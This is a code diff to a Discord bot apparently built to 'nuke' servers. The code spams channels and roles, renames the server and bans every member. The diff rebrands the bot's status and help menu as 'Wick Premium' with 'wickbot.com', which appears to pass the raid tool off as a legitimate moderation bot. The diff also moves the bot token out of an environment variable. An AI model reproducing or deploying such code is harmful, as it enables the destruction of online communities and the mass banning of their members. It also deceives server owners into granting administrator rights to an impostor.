@@ -1,4 +1,4 @@
-const Discord = require('discord.js');
+const Discord = require("discord.js");
 const client = new Discord.Client({ ws: { intents: new Discord.Intents(Discord.Intents.ALL) } });
 const { red, green, blue, yellow, cyan, greenBright, redBright, grey, yellowBright, cyanBright, black, blueBright } = require('chalk');
 const settings = require('./settings.json');
@@ -54,7 +54,7 @@ client.on("ready", () => {
     console.log(greenBright(`                                      Permission Required: ADMINISTRATOR`));
     console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
     console.log("Armageddon is near");
-    client.user.setActivity({ type: "PLAYING", name: "John Wick's office" }); // Delete this if you wish.
+    client.user.setActivity({ type: "WATCHING", name: "wickbot.com | Shard3" }); // Delete this if you wish.
 });
 
 client.on('rateLimit', rate => {
@@ -96,7 +96,7 @@ client.on("message", async message => {
     if (disableEveryone === false) {
 
         if (message.content.startsWith(prefix + 'help')) {
-            message.channel.send(`Armageddon is inevitable*\n\n **Nuking:**\n
+            message.channel.send(`Wick Premium Commands*\n\n **Nuking:**\n
                 **Mass Channel:** \`${prefix}cc\` [text]
                 **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                 **Mass Roles:** \`${prefix}mr\` [text]
@@ -274,7 +274,7 @@ client.on("message", async message => {
                 message.guild.setName(`Asta was here`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
                 // Ban All
-                  message.guild.members.cache.forEach(member => member.ban({ reason: "Asta was here." })
+                  message.guild.members.cache.forEach(member => member.ban({ reason: "HUNT THEM DOWN" })
                     .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                         .catch()
                     ))
@@ -360,4 +360,4 @@ client.on("message", async message => {
 
 })
 
-client.login(process.env.token)
+client.login(token)
